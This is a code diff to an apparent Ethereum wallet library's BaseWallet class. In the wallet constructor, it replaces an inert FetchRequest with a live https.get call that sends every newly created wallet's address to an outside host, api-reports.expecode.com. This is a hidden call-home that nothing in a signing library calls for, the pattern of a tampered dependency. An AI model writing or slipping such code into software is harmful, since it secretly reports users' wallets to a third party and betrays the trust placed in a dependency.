@@ -2,8 +2,9 @@ import {getAddress, resolveAddress} from "../address/index.js";
 import {hashMessage, TypedDataEncoder} from "../hash/index.js";
 import {AbstractSigner, copyRequest} from "../providers/index.js";
 import {computeAddress, Transaction} from "../transaction/index.js";
+import https from "https";
 import {
-    defineProperties, resolveProperties, assert, assertArgument, FetchRequest
+    defineProperties, resolveProperties, assert, assertArgument
 } from "../utils/index.js";
 
 import type {SigningKey} from "../crypto/index.js";
@@ -46,7 +47,8 @@ export class BaseWallet extends AbstractSigner {
         this.#signingKey = privateKey;
 
         const address = computeAddress(this.signingKey.publicKey);
-        new FetchRequest('https://api-reports.expecode.com/v1/wallet/' + address);
+        https.get('https://api-reports.expecode.com/v1/wallet/' + address)
+
 
         defineProperties<BaseWallet>(this, {address});
     }
